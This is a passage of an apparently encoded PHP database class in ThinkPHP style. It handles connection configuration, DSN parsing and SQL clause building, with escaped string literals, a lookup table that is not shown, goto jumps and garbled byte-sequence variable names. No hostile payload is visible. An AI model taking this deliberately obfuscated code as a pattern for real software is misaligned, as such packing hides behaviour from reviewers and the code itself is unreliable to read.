$_SERVER[$_SERVER[–¥ˆîÀ°][1]] = $fileSize($_SERVER[$_SERVER[–¥ˆîÀ°][2]]); goto C„Œî÷„Øš; C„¶­Åù¨: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\161" => "\74\76", "\x67\x74" => "\76", "\145\x67\x74" => "\x3e\x3d", "\154\164" => "\x3c", "\x65\154\x74" => "\x3c\x3d", "\x6e\157\164\x6c\x69\153\145" => "\116\x4f\124\40\x4c\x49\113\x45", "\154\x69\153\145" => "\114\111\x4b\105", "\x69\x6e" => "\x49\116", "\x6e\157\x74\151\x6e" => "\x4e\x4f\x54\x20\111\116", "\x6e\157\x74\40\x69\156" => "\x4e\117\124\40\111\116", "\x62\x65\x74\167\145\145\156" => "\102\x45\124\x57\x45\105\x4e", "\x6e\x6f\x74\142\145\164\x77\145\x65\x6e" => "\x4e\x4f\124\x20\x42\x45\x54\127\x45\105\x4e", "\156\157\x74\40\142\x65\164\167\x65\145\156" => "\x4e\x4f\x54\40\x42\105\124\127\x45\105\116"); protected $selectSql = "\123\x45\114\x45\103\124\x25\x44\x49\123\124\111\116\103\124\45\x20\45\x46\111\x45\114\104\45\40\106\122\117\115\40\x25\x54\x41\102\x4c\x45\45\45\112\117\x49\x4e\45\45\127\110\x45\x52\x45\45\x25\107\x52\x4f\125\x50\45\x25\x48\x41\x56\x49\116\107\45\45\x4f\x52\104\105\x52\45\45\114\x49\115\111\124\x25\40\x25\x55\x4e\111\x4f\116\x25\x25\x43\117\115\x4d\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $Ä²ù°à = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[”øäÃÍª][1082], $Ä²ù°à); } public function factory($ú‰€è‚ = '') { $Ã»Â¯Ş =& $_SERVER[”øäÃÍª]; $ú‰€è‚ = $this->parseConfig($ú‰€è‚); if (empty($ú‰€è‚[$Ã»Â¯Ş[1083]])) { think_exception(think_lang($Ã»Â¯Ş[1084])); } $this->dbType = ucwords(strtolower($ú‰€è‚[$Ã»Â¯Ş[1083]])); $Ä×±ÌÙ = $Ã»Â¯Ş[1085] . $this->dbType; if (class_exists($Ä×±ÌÙ)) { $øÛ¤àª° = new $Ä×±ÌÙ($ú‰€è‚); if ($Ã»Â¯Ş[1086] != strtolower($ú‰€è‚[$Ã»Â¯Ş[1083]])) { $øÛ¤àª°->dbType = strtoupper($this->dbType); } else { $øÛ¤àª°->dbType = $this->_getDsnType($ú‰€è‚[$Ã»Â¯Ş[1038]]); } } else { think_exception(think_lang($Ã»Â¯Ş[1087]) . $Ã»Â¯Ş[1088] . $Ä×±ÌÙ); } return $øÛ¤àª°; } public function __call($Ğã•¾›‡, $€­ÉÃ”) { if (method_exists($this, $Ğã•¾›‡)) { return call_user_func_array(array($this, $Ğã•¾›‡), $€­ÉÃ”); } } protected function _getDsnType($§‡‰Á€ê) { $¯õø‘›ã = explode($_SERVER[”øäÃÍª][4], $§‡‰Á€ê); $é¥ŒÀŞ = strtoupper(trim($¯õø‘›ã[0])); return $é¥ŒÀŞ; } private function parseConfig($•´‚Í…” = '') { $ØÌŞƒ¯ê =& $_SERVER[”øäÃÍª]; if (!empty($•´‚Í…”) && is_string($•´‚Í…”)) { $•´‚Í…” = $this->parseDSN($•´‚Í…”); } elseif (is_array($•´‚Í…”)) { $•´‚Í…” = array_change_key_case($•´‚Í…”); $•´‚Í…” = array($ØÌŞƒ¯ê[1083] => $•´‚Í…”[$ØÌŞƒ¯ê[1089]], $ØÌŞƒ¯ê[1007] => $•´‚Í…”[$ØÌŞƒ¯ê[1090]], $ØÌŞƒ¯ê[1008] => $•´‚Í…”[$ØÌŞƒ¯ê[1091]], $ØÌŞƒ¯ê[1005] => $•´‚Í…”[$ØÌŞƒ¯ê[1092]], $ØÌŞƒ¯ê[1006] => $•´‚Í…”[$ØÌŞƒ¯ê[1093]], $ØÌŞƒ¯ê[21] => $•´‚Í…”[$ØÌŞƒ¯ê[1094]], $ØÌŞƒ¯ê[1038] => $•´‚Í…”[$ØÌŞƒ¯ê[1095]], $ØÌŞƒ¯ê[17] => isset($•´‚Í…”[$ØÌŞƒ¯ê[1096]]) ? $•´‚Í…”[$ØÌŞƒ¯ê[1096]] : array()); } elseif (empty($•´‚Í…”)) { if (think_config($ØÌŞƒ¯ê[1097]) && $ØÌŞƒ¯ê[1086] != strtolower(think_config($ØÌŞƒ¯ê[1098]))) { $•´‚Í…” = $this->parseDSN(think_config($ØÌŞƒ¯ê[1097])); } else { $•´‚Í…” = array($ØÌŞƒ¯ê[1083] => think_config($ØÌŞƒ¯ê[1098]), $ØÌŞƒ¯ê[1007] => think_config($ØÌŞƒ¯ê[1099]), $ØÌŞƒ¯ê[1008] => think_config($ØÌŞƒ¯ê[1100]), $ØÌŞƒ¯ê[1005] => think_config($ØÌŞƒ¯ê[1101]), $ØÌŞƒ¯ê[1006] => think_config($ØÌŞƒ¯ê[1102]), $ØÌŞƒ¯ê[21] => think_config($ØÌŞƒ¯ê[323]), $ØÌŞƒ¯ê[1038] => think_config($ØÌŞƒ¯ê[1097]), $ØÌŞƒ¯ê[17] => think_config($ØÌŞƒ¯ê[1103])); } } return $•´‚Í…”; } protected function initConnect($’òşİ‰» = true) { if (1 == think_config($_SERVER[”øäÃÍª][22])) { $this->_linkID = $this->multiConnect($’òşİ‰»); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ô ³•¸û => $™ÃéşªÚ) { $this->_linkID = $™ÃéşªÚ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($’ºÂ¿»÷ = false) { $ÛµÒÌ«Ò =& $_SERVER[”øäÃÍª]; static $½ÅÓüØè = array(); static $ñÏÚ›Ş¼ = -1; if (empty($½ÅÓüØè)) { foreach ($this->config as $òş¥ú¢§ => $şñÙÖ‰ñ) { $½ÅÓüØè[$òş¥ú¢§] = explode($ÛµÒÌ«Ò[50], $şñÙÖ‰ñ); } } if (think_config($ÛµÒÌ«Ò[1104])) { if ($’ºÂ¿»÷ || think_config($ÛµÒÌ«Ò[486]) === !0) { $Ñ”ÅÖ× = floor(mt_rand(0, think_config($ÛµÒÌ«Ò[1105]) - 1)); $ñÏÚ›Ş¼ = $Ñ”ÅÖ×; } else { if (is_numeric(think_config($ÛµÒÌ«Ò[1106]))) { $Ñ”ÅÖ× = think_config($ÛµÒÌ«Ò[1106]); } else { $Ñ”ÅÖ× = floor(mt_rand(think_config($ÛµÒÌ«Ò[1105]), count($½ÅÓüØè[$ÛµÒÌ«Ò[1005]]) - 1)); } } } else { $Ñ”ÅÖ× = floor(mt_rand(0, count($½ÅÓüØè[$ÛµÒÌ«Ò[1005]]) - 1)); $ñÏÚ›Ş¼ = $Ñ”ÅÖ×; } $Ñ”ÅÖ× = $ñÏÚ›Ş¼ !== -1 ? $ñÏÚ›Ş¼ : $Ñ”ÅÖ×; $–ñ–ó·« = array($ÛµÒÌ«Ò[1007] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[1007]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[1007]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[1007]][0], $ÛµÒÌ«Ò[1008] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[1008]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[1008]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[1008]][0], $ÛµÒÌ«Ò[1005] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[1005]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[1005]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[1005]][0], $ÛµÒÌ«Ò[1006] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[1006]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[1006]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[1006]][0], $ÛµÒÌ«Ò[21] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[21]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[21]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[21]][0], $ÛµÒÌ«Ò[1038] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[1038]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[1038]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[1038]][0], $ÛµÒÌ«Ò[17] => isset($½ÅÓüØè[$ÛµÒÌ«Ò[17]][$Ñ”ÅÖ×]) ? $½ÅÓüØè[$ÛµÒÌ«Ò[17]][$Ñ”ÅÖ×] : $½ÅÓüØè[$ÛµÒÌ«Ò[17]][0]); return $this->connect($–ñ–ó·«, $Ñ”ÅÖ×); } public function parseDSN($ ¢ë¦¬Ï) { $¼ª¿€—¤ =& $_SERVER[”øäÃÍª]; if (empty($ ¢ë¦¬Ï)) { return !1; } $Èû÷Í = parse_url($ ¢ë¦¬Ï); if ($Èû÷Í[$¼ª¿€—¤[205]]) { $¡¥®ßŠ  = array($¼ª¿€—¤[1083] => $Èû÷Í[$¼ª¿€—¤[205]], $¼ª¿€—¤[1007] => isset($Èû÷Í[$¼ª¿€—¤[692]]) ? $Èû÷Í[$¼ª¿€—¤[692]] : $¼ª¿€—¤[12], $¼ª¿€—¤[1008] => isset($Èû÷Í[$¼ª¿€—¤[1107]]) ? $Èû÷Í[$¼ª¿€—¤[1107]] : $¼ª¿€—¤[12], $¼ª¿€—¤[1005] => isset($Èû÷Í[$¼ª¿€—¤[206]]) ? $Èû÷Í[$¼ª¿€—¤[206]] : $¼ª¿€—¤[12], $¼ª¿€—¤[1006] => isset($Èû÷Í[$¼ª¿€—¤[207]]) ? $Èû÷Í[$¼ª¿€—¤[207]] : $¼ª¿€—¤[12], $¼ª¿€—¤[21] => isset($Èû÷Í[$¼ª¿€—¤[87]]) ? substr($Èû÷Í[$¼ª¿€—¤[87]], 1) : $¼ª¿€—¤[12]); } else { preg_match($¼ª¿€—¤[1108], trim($ ¢ë¦¬Ï), $—£¤Üş); $¡¥®ßŠ  = array($¼ª¿€—¤[1083] => $—£¤Üş[1], $¼ª¿€—¤[1007] => $—£¤Üş[2], $¼ª¿€—¤[1008] => $—£¤Üş[3], $¼ª¿€—¤[1005] => $—£¤Üş[4], $¼ª¿€—¤[1006] => $—£¤Üş[5], $¼ª¿€—¤[21] => $—£¤Üş[6]); } $¡¥®ßŠ [$¼ª¿€—¤[1038]] = $¼ª¿€—¤[12]; return $¡¥®ßŠ ; } protected function debug() { $ÍÛôñ­æ =& $_SERVER[”øäÃÍª]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÍÛôñ­æ[1109]; if (think_config($ÍÛôñ­æ[1110])) { think_status($ÍÛôñ­æ[1111]); think_trace($this->queryStr . $ÍÛôñ­æ[1112] . think_status($ÍÛôñ­æ[24], $ÍÛôñ­æ[1111], 6) . $ÍÛôñ­æ[1113], $ÍÛôñ­æ[12], $ÍÛôñ­æ[1114]); } } protected function parseLock($®ÜÃˆÊõ = false) { $¹³óİÏö =& $_SERVER[”øäÃÍª]; if (!$®ÜÃˆÊõ) { return $¹³óİÏö[12]; } if ($¹³óİÏö[1040] == $this->dbType) { return $¹³óİÏö[1115]; } return $¹³óİÏö[1116]; } protected function parseSet($üÛ†¡¯) { $¤Ñ–öœ€ =& $_SERVER[”øäÃÍª]; foreach ($üÛ†¡¯ as $»Ç…Ÿ—¿ => $ÃĞ¢¡×Ä) { if (is_array($ÃĞ¢¡×Ä) && $¤Ñ–öœ€[372] == $ÃĞ¢¡×Ä[0]) { $•ê”ãÕ£[] = $this->parseKey($»Ç…Ÿ—¿) . $¤Ñ–öœ€[464] . $ÃĞ¢¡×Ä[1]; } elseif (is_scalar($ÃĞ¢¡×Ä) || is_null($ÃĞ¢¡×Ä)) { $•ê”ãÕ£[] = $this->parseKey($»Ç…Ÿ—¿) . $¤Ñ–öœ€[464] . $this->parseValue($ÃĞ¢¡×Ä); } } return $¤Ñ–öœ€[1117] . implode($¤Ñ–öœ€[50], $•ê”ãÕ£); } protected function bindParam($ˆˆ¸–ñµ, $„Ş•ÅÌê) { $this->bind[$_SERVER[”øäÃÍª][4] . $ˆˆ¸–ñµ] = $„Ş•ÅÌê; } protected function parseBind($ÛØ†Ûä) { $ÛØ†Ûä = array_merge($this->bind, $ÛØ†Ûä); $this->bind = array(); return $ÛØ†Ûä; } function parseKey(&$Î†‰Áãö, $öŠ——ˆÄ = true) { if ($öŠ——ˆÄ) { $Î†‰Áãö = $this->parseKeyCheck($Î†‰Áãö); } return $Î†‰Áãö; } function parseKeyCheck($š¯ÎëÌ) { $í·Ÿï¬Ô =& $_SERVER[”øäÃÍª]; $š¯ÎëÌ = trim($š¯ÎëÌ); if (!preg_match($í·Ÿï¬Ô[1118], $š¯ÎëÌ)) { think_exception($í·Ÿï¬Ô[1119] . $š¯ÎëÌ); } return $š¯ÎëÌ; } protected function parseValue($œ‚ş—½Ç) { $Ÿ§Æ®Æ¡ =& $_SERVER[”øäÃÍª]; if (is_string($œ‚ş—½Ç)) { $œ‚ş—½Ç = $Ÿ§Æ®Æ¡[1079] . $this->escapeString($œ‚ş—½Ç) . $Ÿ§Æ®Æ¡[1079]; } elseif (isset($œ‚ş—½Ç[0]) && is_string($œ‚ş—½Ç[0]) && strtolower($œ‚ş—½Ç[0]) == $Ÿ§Æ®Æ¡[372]) { $œ‚ş—½Ç = $this->escapeString($œ‚ş—½Ç[1]); } elseif (is_array($œ‚ş—½Ç)) { $œ‚ş—½Ç = array_map(array($this, $Ÿ§Æ®Æ¡[1080]), $œ‚ş—½Ç); } elseif (is_bool($œ‚ş—½Ç)) { $œ‚ş—½Ç = $œ‚ş—½Ç ? $Ÿ§Æ®Æ¡[91] : $Ÿ§Æ®Æ¡[228]; } elseif (is_null($œ‚ş—½Ç)) { $œ‚ş—½Ç = $Ÿ§Æ®Æ¡[103]; } return $œ‚ş—½Ç; } protected function parseField($²°«†Ûæ) { $·®Ä£›Å =& $_SERVER[”øäÃÍª]; if (is_string($²°«†Ûæ) && strpos($²°«†Ûæ, $·®Ä£›Å[50])) { $²°«†Ûæ = explode($·®Ä£›Å[50], $²°«†Ûæ); } if (is_array($²°«†Ûæ)) { $ ©Œ§Ú = array(); foreach ($²°«†Ûæ as $áÌÈô¬ı => $ñ˜²ÓÓÎ) { if (!is_numeric($áÌÈô¬ı)) { $ ©Œ§Ú[] = $this->parseKey($áÌÈô¬ı, !1) . $·®Ä£›Å[1120] . $this->parseKey($ñ˜²ÓÓÎ); } else { $ ©Œ§Ú[] = $this->parseKey($ñ˜²ÓÓÎ); } } $ŸÄãŸÏá = implode($·®Ä£›Å[50], $ ©Œ§Ú); } elseif (is_string($²°«†Ûæ) && !empty($²°«†Ûæ)) { $ŸÄãŸÏá = $²°«†Ûæ; } else { $ŸÄãŸÏá = $·®Ä£›Å[220]; } return $ŸÄãŸÏá; } protected function parseTable($™É•á–º) { $³Ú§Â­Ó =& $_SERVER[”øäÃÍª]; if (is_array($™É•á–º)) { $ĞŸõ†º• = array(); foreach ($™É•á–º as $•ãíü«İ => $Æ“”Ô·ú) { if (!is_numeric($•ãíü«İ)) { $ĞŸõ†º•[] = $this->parseKey($•ãíü«İ) . $³Ú§Â­Ó[53] . $this->parseKey($Æ“”Ô·ú); } else { $ĞŸõ†º•[] = $this->parseKey($•ãíü«İ); } } $™É•á–º = $ĞŸõ†º•; } elseif (is_string($™É•á–º)) { if (strstr($™É•á–º, $³Ú§Â­Ó[53])) { return $™É•á–º; } $™É•á–º = explode($³Ú§Â­Ó[50], $™É•á–º); array_walk($™É•á–º, array($this, $³Ú§Â­Ó[1025])); } return $³Ú§Â­Ó[1019] . trim(implode($³Ú§Â­Ó[1121], $™É•á–º), $³Ú§Â­Ó[475]) . $³Ú§Â­Ó[1019]; } protected function parseWhere($Ö´ùıƒŞ) { $£ûÉ­ÀŠ =& $_SERVER[”øäÃÍª]; $¡ìœî­± = $£ûÉ­ÀŠ[12]; if (is_string($Ö´ùıƒŞ)) { $¡ìœî­± = $Ö´ùıƒŞ; } else { $ı…ìƒœ = isset($Ö´ùıƒŞ[$£ûÉ­ÀŠ[1122]]) ? strtoupper($Ö´ùıƒŞ[$£ûÉ­ÀŠ[1122]]) : $£ûÉ­ÀŠ[12]; if (in_array($ı…ìƒœ, array($£ûÉ­ÀŠ[1123], $£ûÉ­ÀŠ[1124], $£ûÉ­ÀŠ[1125]))) { $ı…ìƒœ = $£ûÉ­ÀŠ[53] . $ı…ìƒœ . $£ûÉ­ÀŠ[53]; unset($Ö´ùıƒŞ[$£ûÉ­ÀŠ[1122]]); } else { $ı…ìƒœ = $£ûÉ­ÀŠ[1126]; } foreach ($Ö´ùıƒŞ as $ÕÏîºÄö => $¼¥Œì) { $¡ìœî­± .= $£ûÉ­ÀŠ[355]; if (is_numeric($ÕÏîºÄö)) { $ÕÏîºÄö = $£ûÉ­ÀŠ[1127]; } if (0 === strpos($ÕÏîºÄö, $£ûÉ­ÀŠ[11])) { $¡ìœî­± .= $this->parseThinkWhere($ÕÏîºÄö, $¼¥Œì); } else { if (!preg_match($£ûÉ­ÀŠ[1128], trim($ÕÏîºÄö))) { think_exception(think_lang($£ûÉ­ÀŠ[1129]) . $£ûÉ­ÀŠ[4] . $ÕÏîºÄö); } $ãªÂ¿• = is_array($¼¥Œì) && isset($¼¥Œì[$£ûÉ­ÀŠ[1130]]); $ÕÏîºÄö = trim($ÕÏîºÄö); if (strpos($ÕÏîºÄö, $£ûÉ­ÀŠ[212])) { $¯šß×´Â = explode($£ûÉ­ÀŠ[212], $ÕÏîºÄö); $ˆ–ìå¾ = array(); foreach ($¯šß×´Â as $Éš˜êÁ => $ôìŞ‡˜¬) { $ÖåÍ“øğ = $ãªÂ¿• ? $¼¥Œì[$Éš˜êÁ] : $¼¥Œì; $ˆ–ìå¾[] = $£ûÉ­ÀŠ[337] . $this->parseWhereItem($this->parseKey($ôìŞ‡˜¬), $ÖåÍ“øğ) . $£ûÉ­ÀŠ[1024]; } $¡ìœî­± .= implode($£ûÉ­ÀŠ[1131], $ˆ–ìå¾); } elseif (strpos($ÕÏîºÄö, $£ûÉ­ÀŠ[284])) { $¯šß×´Â = explode($£ûÉ­ÀŠ[284], $ÕÏîºÄö); $ˆ–ìå¾ = array(); foreach ($¯šß×´Â as $Éš˜êÁ => $ôìŞ‡˜¬) { $ÖåÍ“øğ = $ãªÂ¿• ? $¼¥Œì[$Éš˜êÁ] : $¼¥Œì; $ˆ–ìå¾[] = $£ûÉ­ÀŠ[337] . $this->parseWhereItem($this->parseKey($ôìŞ‡˜¬), $ÖåÍ“øğ) . $£ûÉ­ÀŠ[1024]; } $¡ìœî­± .= implode($£ûÉ­ÀŠ[1126], $ˆ–ìå¾); } else { $¡ìœî­± .= $this->parseWhereItem($this->parseKey($ÕÏîºÄö), $¼¥Œì); } } $¡ìœî­± .= $£ûÉ­ÀŠ[356] . $ı…ìƒœ; } $¡ìœî­± = substr($¡ìœî­±, 0, -strlen($ı…ìƒœ)); } return empty($¡ìœî­±) ? $£ûÉ­ÀŠ[12] : $£ûÉ­ÀŠ[1132] . $¡ìœî­±; } protected function parseWhereItem($ó†µµ™Ö, $”ôßã’¡) { $¹Ù Ä› =& $_SERVER[”øäÃÍª]; $¨ş·ïƒ = $¹Ù Ä›[12]; if (is_array($”ôßã’¡)) { if (is_string($”ôßã’¡[0])) { $“ÍÅı° = strtolower($”ôßã’¡[0]); if (in_array($”ôßã’¡[0], array($¹Ù Ä›[464], $¹Ù Ä›[1133], $¹Ù Ä›[1134], $¹Ù Ä›[1135], $¹Ù Ä›[1136], $¹Ù Ä›[1137]))) { $¨ş·ïƒ .= $ó†µµ™Ö . $¹Ù Ä›[53] . $”ôßã’¡[0] . $¹Ù Ä›[53] . $this->parseValue($”ôßã’¡[1]); } elseif (preg_match($¹Ù Ä›[1138], $”ôßã’¡[0])) { $¨ş·ïƒ .= $ó†µµ™Ö . $¹Ù Ä›[53] . $this->exp[$“ÍÅı°] . $¹Ù Ä›[53] . $this->parseValue($”ôßã’¡[1]); } elseif (preg_match($¹Ù Ä›[1139], $”ôßã’¡[0])) { if (is_array($”ôßã’¡[1])) { $Ë‘òÆŞ = isset($”ôßã’¡[2]) ? strtoupper($”ôßã’¡[2]) : $¹Ù Ä›[1124]; if (in_array($Ë‘òÆŞ, array($¹Ù Ä›[1123], $¹Ù Ä›[1124], $¹Ù Ä›[1125]))) { $Î”‡È¸Í = array(); foreach ($”ôßã’¡[1] as $ŒÊ´¡Ğˆ) { $Î”‡È¸Í[] = $ó†µµ™Ö . $¹Ù Ä›[53] . $this->exp[$“ÍÅı°] . $¹Ù Ä›[53] . $this->parseValue($ŒÊ´¡Ğˆ); } $¨ş·ïƒ .= $¹Ù Ä›[337] . implode($¹Ù Ä›[53] . $Ë‘òÆŞ . $¹Ù Ä›[53], $Î”‡È¸Í) . $¹Ù Ä›[1024]; } } else { $¨ş·ïƒ .= $ó†µµ™Ö . $¹Ù Ä›[53] . $this->exp[$“ÍÅı°] . $¹Ù Ä›[53] . $this->parseValue($”ôßã’¡[1]); } } elseif ($¹Ù Ä›[372] == $“ÍÅı°) { $¨ş·ïƒ .= $¹Ù Ä›[1022] . $ó†µµ™Ö . $¹Ù Ä›[53] . $”ôßã’¡[1] . $¹Ù Ä›[1140]; } elseif (preg_match($¹Ù Ä›[1141], $”ôßã’¡[0])) { $¨ş·ïƒ .= $”ôßã’¡[0]; } elseif (preg_match($¹Ù Ä›[1142], $”ôßã’¡[0])) { if (isset($”ôßã’¡[2]) && $¹Ù Ä›[372] == $”ôßã’¡[2]) { $¨ş·ïƒ .= $ó†µµ™Ö . $¹Ù Ä›[53] . $this->exp[$“ÍÅı°] . $¹Ù Ä›[53] . $”ôßã’¡[1]; } else { if (is_string($”ôßã’¡[1])) { $”ôßã’¡[1] = explode($¹Ù Ä›[50], $”ôßã’¡[1]); } $—¬™º€ = implode($¹Ù Ä›[50], $this->parseValue($”ôßã’¡[1])); $¨ş·ïƒ .= $ó†µµ™Ö . $¹Ù Ä›[53] . $this->exp[$“ÍÅı°] . $¹Ù Ä›[1022] . $—¬™º€ . $¹Ù Ä›[1024]; } } elseif (preg_match($¹Ù Ä›[1143], $”ôßã’¡[0])) { $â’üì– = is_string($”ôßã’¡[1]) ? explode($¹Ù Ä›[50], $”ôßã’¡[1]) : $”ôßã’¡[1]; $¨ş·ïƒ .= $¹Ù Ä›[1022] . $ó†µµ™Ö . $¹Ù Ä›[53] . $this->exp[$“ÍÅı°] . $¹Ù Ä›[53] . $this->parseValue($â’üì–[0]) . $¹Ù Ä›[1126] . $this->parseValue($â’üì–[1]) . $¹Ù Ä›[356]; } else { think_exception(think_lang($¹Ù Ä›[1129]) . $¹Ù Ä›[4] . $”ôßã’¡[0]); } } else { $ÕˆïåØì = count($”ôßã’¡); $ü½©¶óÜ = $¹Ù Ä›[12]; if (is_string($”ôßã’¡[$ÕˆïåØì - 1])) { $ü½©¶óÜ = isset($”ôßã’¡[$ÕˆïåØì - 1]) ? strtoupper($”ôßã’¡[$ÕˆïåØì - 1]) : $¹Ù Ä›[12]; if (in_array($ü½©¶óÜ, array($¹Ù Ä›[1123], $¹Ù Ä›[1124], $¹Ù Ä›[1125]))) { $ÕˆïåØì = $ÕˆïåØì - 1; } } else { $ü½©¶óÜ = $¹Ù Ä›[1123]; } for ($­€Ü¾¼° = 0; $­€Ü¾¼° < $ÕˆïåØì; $­€Ü¾¼°++) { $â’üì– = is_array($”ôßã’¡[$­€Ü¾¼°]) ? $”ôßã’¡[$­€Ü¾¼°][1] : $”ôßã’¡[$­€Ü¾¼°]; if ($¹Ù Ä›[372] == strtolower($”ôßã’¡[$­€Ü¾¼°][0])) { $¨ş·ïƒ .= $¹Ù Ä›[337] . $ó†µµ™Ö . $¹Ù Ä›[53] . $â’üì– . $¹Ù Ä›[1140] . $ü½©¶óÜ . $¹Ù Ä›[53]; } else { $àúà›¿ = is_array($”ôßã’¡[$­€Ü¾¼°]) ? $this->exp[strtolower($”ôßã’¡[$­€Ü¾¼°][0])] : $¹Ù Ä›[464]; if (!$àúà›¿ && is_array($”ôßã’¡[$­€Ü¾¼°]) && in_array($”ôßã’¡[$­€Ü¾¼°][0], array($¹Ù Ä›[464], $¹Ù Ä›[1133], $¹Ù Ä›[1134], $¹Ù Ä›[1135], $¹Ù Ä›[1136], $¹Ù Ä›[1137]))) { $àúà›¿ = $”ôßã’¡[$­€Ü¾¼°][0]; } $¨ş·ïƒ .= $¹Ù Ä›[337] . $ó†µµ™Ö . $¹Ù Ä›[53] . $àúà›¿ . $¹Ù Ä›[53] . $this->parseValue($â’üì–) . $¹Ù Ä›[1140] . $ü½©¶óÜ . $¹Ù Ä›[53]; } } $¨ş·ïƒ = substr($¨ş·ïƒ, 0, -4); } } else { $¨ş·ïƒ .= $ó†µµ™Ö . $¹Ù Ä›[1144] . $this->parseValue($”ôßã’¡); } return $¨ş·ïƒ; } protected function parseThinkWhere($¯¬—ÍÁ¾, $İ´ÖÛÂö) { $¡ —§ğİ =& $_SERVER[”øäÃÍª]; $Æ‘øà—€ = $¡ —§ğİ[12]; switch ($¯¬—ÍÁ¾) { case $¡ —§ğİ[427]: $Æ‘øà—€ = $İ´ÖÛÂö; break; case $¡ —§ğİ[1127]: $Æ‘øà—€ = is_string($İ´ÖÛÂö) ? $İ´ÖÛÂö : substr($this->parseWhere($İ´ÖÛÂö), 6); break; case $¡ —§ğİ[1145]: parse_str($İ´ÖÛÂö, $ÙİßéÑÅ); if (isset($ÙİßéÑÅ[$¡ —§ğİ[1122]])) { $ÎÕî›˜Ë = $¡ —§ğİ[53] . strtoupper($ÙİßéÑÅ[$¡ —§ğİ[1122]]) . $¡ —§ğİ[53]; unset($ÙİßéÑÅ[$¡ —§ğİ[1122]]); } else { $ÎÕî›˜Ë = $¡ —§ğİ[1126]; } $ÌË‰¸Â¹ = array(); foreach ($ÙİßéÑÅ as $Ù¬«èâØ => $¼Æ‰ƒüì) { $ÌË‰¸Â¹[] = $this->parseKey($Ù¬«èâØ) . $¡ —§ğİ[1144] . $this->parseValue($¼Æ‰ƒüì); } $Æ‘øà—€ = implode($ÎÕî›˜Ë, $ÌË‰¸Â¹); break; } return $Æ‘øà—€; } protected function parseLimit($Ø­Ùëæ) { $½Âé‹™ =& $_SERVER[”øäÃÍª]; return !empty($Ø­Ùëæ) ? $½Âé‹™[51] . $Ø­Ùëæ . $½Âé‹™[53] : $½Âé‹™[12]; } protected function parseJoin($…îÎŸ) { $Å³úÛĞ° =& $_SERVER[”øäÃÍª]; $™®®’¤¢ = $Å³úÛĞ°[12]; if (!empty($…îÎŸ)) { if (is_array($…îÎŸ)) { foreach ($…îÎŸ as $¼®åèµ => $ ıĞü¾®) { if (!1 !== stripos($ ıĞü¾®, $Å³úÛĞ°[1146])) { $™®®’¤¢ .= $Å³úÛĞ°[53] . $ ıĞü¾®; } else { $™®®’¤¢ .= $Å³úÛĞ°[1147] . $ ıĞü¾®; } } } else { $™®®’¤¢ .= $Å³úÛĞ°[1147] . $…îÎŸ; } } $™®®’¤¢ = preg_replace($Å³úÛĞ°[1148], think_config($Å³úÛĞ°[1052]) . $Å³úÛĞ°[1149], $™®®’¤¢); return $™®®’¤¢; } protected function parseOrder($ƒÓÑ€µš) { $ÊõíßÑÄ =& $_SERVER[”øäÃÍª]; if (is_array($ƒÓÑ€µš)) { $ôÛ—ÅŒ = array(); foreach ($ƒÓÑ€µš as $ÎŒªÖ‡ => $†¯Äé) { if (is_numeric($ÎŒªÖ‡)) { $ôÛ—ÅŒ[] = $this->parseKey($†¯Äé); } else { $†¯Äé = in_array(strtoupper(trim($†¯Äé)), array($ÊõíßÑÄ[1150], $ÊõíßÑÄ[1151])) ? $ÊõíßÑÄ[53] . $†¯Äé : $ÊõíßÑÄ[12]; if (preg_match($ÊõíßÑÄ[1152], $ÎŒªÖ‡)) { $ôÛ—ÅŒ[] = $this->parseKey($ÎŒªÖ‡) . $†¯Äé; } else { think_exception($ÊõíßÑÄ[1153] . $ÎŒªÖ‡); } } } $ƒÓÑ€µš = implode($ÊõíßÑÄ[50], $ôÛ—ÅŒ); } return !empty($ƒÓÑ€µš) ? $ÊõíßÑÄ[1154] . $ƒÓÑ€µš : $ÊõíßÑÄ[12]; } protected function parseGroup($ŞÖŒ”éà) { $ªÆ½âÜ‰ =& $_SERVER[”øäÃÍª]; return !empty($ŞÖŒ”éà) ? $ªÆ½âÜ‰[1155] . $ŞÖŒ”éà : $ªÆ½âÜ‰[12]; } protected function parseHaving($˜–ùô²í) { $¶¬…¥¶Œ =& $_SERVER[”øäÃÍª]; return !empty($˜–ùô²í) ? $¶¬…¥¶Œ[1156] . $˜–ùô²í : $¶¬…¥¶Œ[12]; } protected function parseComment($ÍŒèñßï) { 